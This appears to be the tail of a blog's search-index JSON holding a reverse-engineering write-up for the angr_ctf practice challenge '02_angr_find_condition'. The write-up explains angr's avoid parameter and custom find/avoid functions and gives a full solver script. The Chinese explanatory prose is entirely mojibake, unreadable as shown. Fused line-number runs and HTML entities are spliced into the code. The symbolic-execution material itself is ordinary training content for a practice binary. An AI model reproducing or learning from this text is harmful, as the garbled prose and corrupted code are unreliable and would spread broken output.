è¿™ä¸€æ¬¡çš„æ–‡ä»¶è¾ƒå¤§ï¼Œmainå‡½æ•°åœ¨idaä¸­ä¸èƒ½F5ï¼Œå³ä¾¿F5è¿‡åä¹Ÿå¯èƒ½å› ä¸ºä¼ªä»£ç è¾ƒå¤æ‚æ— æ³•é˜…è¯»ï¼Œæ‰€ä»¥åœ¨ç®€å•è§‚å¯Ÿè¿‡åå¯ä»¥ç›´æ¥ç”¨angrçœ‹æ˜¯å¦æœ‰è§£ï¼Œä½†æ˜¯ä½œè€…è¿™æ¬¡åœ¨ç¨‹åºä¸­åŠ äº†ä¸€ç‚¹æ–™ï¼Œæ–¹ä¾¿æˆ‘ä»¬å­¦ä¹ avoidå‚æ•° should_succeedè¿™ä¸ªå˜é‡åˆå§‹å€¼ä¸º1æœ¬èº«å¹¶æ²¡æœ‰é—®é¢˜ä½†æ˜¯avoid_meå‡½æ•°ä¼šå°†should_succeedèµ‹å€¼ä¸º0ã€‚ â€‹ æ‰€ä»¥è¿™ä¸ªå¦‚æœè¦æ‰“å°å‡º**Good Job.**éœ€è¦ä¸¤ä¸ªæ¡ä»¶åŒæ—¶æ»¡è¶³ï¼ˆshould_succeedå€¼ä¸º1ï¼Œä¸”è¾“å…¥çš„å­—ç¬¦ä¸²åŠ å¯†è¿‡åæ»¡è¶³æ¡ä»¶ï¼‰ï¼Œå¦‚æœåœ¨éå†æ—¶ä¸æ·»åŠ avoidæ¡ä»¶ä¼šèŠ±è´¹å¤§é‡çš„æ—¶é—´ï¼ˆè™½ç„¶ç»“æœä¸€æ ·ï¼‰ï¼Œä¸ºäº†å°½å¯èƒ½çš„èŠ‚çº¦æ—¶é—´ï¼Œéœ€è¦åœ¨éå†æ—¶é¿å…avoid_meå‡½æ•°ï¼Œæ‰€ä»¥åœ¨ä¸Šä¸€ä¸ªçš„æ¡ä»¶ä¸‹ï¼Œéœ€è¦åœ¨æ·»åŠ å…¶ä»–æ¡ä»¶ï¼Œè¿™é‡Œéœ€è¦æ·»åŠ avoid 12avoid_addr = 0x080485A8 # avoid_meå‡½æ•°åœ°å€simgr.explore(find = good_addr, avoid = avoid_addr) # æ·»åŠ avoidæ¡ä»¶ 02_angr_condtionå‡ºäº†åœ¨idaä¸­ç›´æ¥å¯»æ‰¾å­—ç¬¦ä¸²åœ°å€ï¼Œè¿˜å¯ä»¥è‡ªå®šä¹‰å‡½æ•°éå†æ‰€æœ‰å­—ç¬¦ä¸²ï¼Œå¯»æ‰¾éœ€è¦çš„å­—ç¬¦ä¸²åœ°å€ 12345678910111213# è‡ªå®šä¹‰å‡½æ•°å¯»æ‰¾å­—ç¬¦ä¸²def is_success(state): #print(state) stdout_stdout = state.posix.dumps(1) print(stdout_stdout) return b&#x27;Good Job.&#x27; in stdout_stdoutdef is_fail(state): #print(state) stdout_stdout = state.posix.dumps(1) print(stdout_stdout) return b&#x27;Try again.&#x27; in stdout_stdout å®Œæ•´è„šæœ¬ 12345678910111213141516171819202122232425262728293031323334353637from z3 import *import angrimport sysdef main(): filepath = &#x27;./02_angr_find_condition&#x27; project = angr.Project(filepath) init = project.factory.entry_state() simgr = project.factory.simgr(init) def is_success(state): #print(state) stdout_stdout = state.posix.dumps(1) print(stdout_stdout) return b&#x27;Good Job.&#x27; in stdout_stdout def is_fail(state): #print(state) stdout_stdout = state.posix.dumps(1) print(stdout_stdout) return b&#x27;Try again.&#x27; in stdout_stdout print(is_success) print(is_fail) simgr.explore(find=is_success, avoid=is_fail) if simgr.found: solution = simgr.found[0] flag = solution.posix.dumps(0) print(flag) else: raise Exception(&#x27;not find&#x27;)if __name__ == &quot;__main__&quot;: main()","categories":[],"tags":[{"name":"re","slug":"re","permalink":"http://example.com/tags/re/"},{"name":"angr","slug":"angr","permalink":"http://example.com/tags/angr/"},{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"}]}],"categories":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/categories/ctf/"},{"name":"web","slug":"ctf/web","permalink":"http://example.com/categories/ctf/web/"},{"name":"re","slug":"ctf/re","permalink":"http://example.com/categories/ctf/re/"},{"name":"pwn","slug":"ctf/pwn","permalink":"http://example.com/categories/ctf/pwn/"},{"name":"pwnable.kr","slug":"ctf/pwn/pwnable-kr","permalink":"http://example.com/categories/ctf/pwn/pwnable-kr/"}],"tags":[{"name":"csapp","slug":"csapp","permalink":"http://example.com/tags/csapp/"},{"name":"git","slug":"git","permalink":"http://example.com/tags/git/"},{"name":"web","slug":"web","permalink":"http://example.com/tags/web/"},{"name":"leetcode","slug":"leetcode","permalink":"http://example.com/tags/leetcode/"},{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"http://example.com/tags/wp/"},{"name":"re","slug":"re","permalink":"http://example.com/tags/re/"},{"name":"pwn","slug":"pwn","permalink":"http://example.com/tags/pwn/"},{"name":"angr","slug":"angr","permalink":"http://example.com/tags/angr/"}]}